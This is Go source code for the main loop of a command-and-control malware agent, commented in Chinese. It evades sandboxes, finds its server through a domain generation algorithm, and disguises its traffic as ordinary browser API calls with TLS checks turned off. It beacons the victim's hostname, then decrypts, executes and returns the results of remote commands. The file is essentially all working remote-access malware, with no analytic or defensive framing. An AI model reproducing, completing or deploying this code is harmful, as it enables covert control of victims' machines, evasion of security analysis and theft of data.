package main

import (
	"basic_c2/agent/commands"
	"basic_c2/agent/evasion"
	"basic_c2/internal/config"
	"basic_c2/internal/crypto"
	"basic_c2/internal/dga"
	"basic_c2/internal/models"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"
)

func main() {
	// 1. 反沙箱检测
	if evasion.CheckSandbox() {
		// 环境可疑，直接退出
		return
	}

	// 2. DGA 域名协商，确定 C2 服务器地址
	// 注意：持久化已由 Loader 完成，Agent 纯内存运行
	finalBaseDomain := dga.NegotiateC2(5 * time.Second)
	finalC2URL := finalBaseDomain + config.C2Endpoint

	fmt.Printf("[+] C2 已锁定: %s\n", finalC2URL)
	fmt.Println("======== [Agent: C2 Loop Started] ========")

	// 3. 初始化 HTTP 客户端
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: tr,
	}

	// 4. 获取主机名
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "UNKNOWN"
	}

	// 5. 主循环：心跳与命令执行
	for {
		// 发送心跳
		reqData := models.FakeAPIRequest{
			Hostname: hostname,
			Status:   "idle",
		}
		jsonData, _ := json.Marshal(reqData)

		req, _ := http.NewRequest("POST", finalC2URL, bytes.NewBuffer(jsonData))
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			time.Sleep(3 * time.Second)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		// 解析服务器响应
		var apiResp models.FakeAPIResponse
		if json.Unmarshal(body, &apiResp) == nil && apiResp.Data != "" {
			// 解密命令
			command, err := crypto.Decrypt(apiResp.Data, config.AESKey)
			if err == nil {
				// 执行命令
				result := commands.Execute(command)

				// 加密结果并回传
				encryptedResult, _ := crypto.Encrypt(result, config.AESKey)
				resultData := models.FakeAPIRequest{
					Hostname: hostname,
					Token:    encryptedResult,
					Status:   "success",
				}
				jsonResult, _ := json.Marshal(resultData)

				postReq, _ := http.NewRequest("POST", finalC2URL, bytes.NewBuffer(jsonResult))
				postReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
				postReq.Header.Set("Content-Type", "application/json")
				client.Do(postReq)
			}
		}

		// 3 秒后再次心跳
		time.Sleep(3 * time.Second)
	}
}
